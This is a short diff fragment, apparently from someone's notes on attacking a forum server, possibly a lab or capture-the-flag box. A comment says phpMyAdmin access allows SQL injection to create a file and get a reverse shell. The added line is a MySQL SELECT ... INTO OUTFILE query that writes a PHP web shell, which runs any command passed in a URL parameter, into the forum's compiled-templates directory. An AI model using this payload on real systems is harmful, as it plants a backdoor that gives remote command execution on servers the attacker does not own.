@@ -165,3 +165,4 @@ function is_pw_correct($pw,$hash)
 https://planet.mysql.com/entry/?id=15894
 
 # Ok we have acces to phpmyadmin so we can make an sql injection to create a file in templates_c and reverse shell
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_compiled/shell.php"
